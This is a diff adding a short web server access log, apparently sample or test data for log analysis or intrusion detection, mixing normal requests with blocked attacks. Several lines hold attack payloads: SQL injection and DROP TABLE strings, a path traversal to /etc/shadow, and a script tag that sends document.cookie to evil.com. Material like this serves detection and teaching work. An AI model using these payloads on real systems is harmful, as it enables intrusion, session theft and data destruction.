@@ -1,0 +1,15 @@
+2024-01-15 08:00:01 [INFO] GET / HTTP/1.1 200 OK UA: Mozilla/5.0
+2024-01-15 08:01:15 [INFO] POST /login HTTP/1.1 302 Redirect
+2024-01-15 08:05:33 [WARN] GET /api/users?id=1'%20UNION%20SELECT%20*%20FROM%20users-- HTTP/1.1 403 Forbidden UA: Mozilla/5.0
+2024-01-15 08:06:00 [INFO] GET /dashboard HTTP/1.1 200 OK UA: Mozilla/5.0
+2024-01-15 08:07:22 [WARN] POST /comment HTTP/1.1 400 Bad Request body=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
+2024-01-15 08:10:01 [INFO] GET /api/products HTTP/1.1 200 OK UA: Mozilla/5.0
+2024-01-15 08:12:44 [WARN] GET /images/../../../etc/shadow HTTP/1.1 400 Bad Request UA: curl/7.88.1
+2024-01-15 08:15:00 [INFO] GET /about HTTP/1.1 200 OK UA: Mozilla/5.0
+2024-01-15 08:16:33 [WARN] GET /search?q='; DROP TABLE users;-- HTTP/1.1 403 Forbidden UA: sqlmap/1.7
+2024-01-15 08:20:00 [INFO] GET /contact HTTP/1.1 200 OK UA: Mozilla/5.0
+2024-01-15 08:22:15 [WARN] GET /admin/config HTTP/1.1 401 Unauthorized
+2024-01-15 08:25:00 [INFO] GET /api/orders HTTP/1.1 200 OK UA: python-requests/2.28.0
+2024-01-15 08:30:00 [INFO] GET / HTTP/1.1 200 OK UA: Nmap Scripting Engine
+2024-01-15 08:35:12 [WARN] POST /upload HTTP/1.1 403 Forbidden UA: Nikto/2.1.6
+2024-01-15 08:40:00 [INFO] GET /api/status HTTP/1.1 200 OK UA: Mozilla/5.0
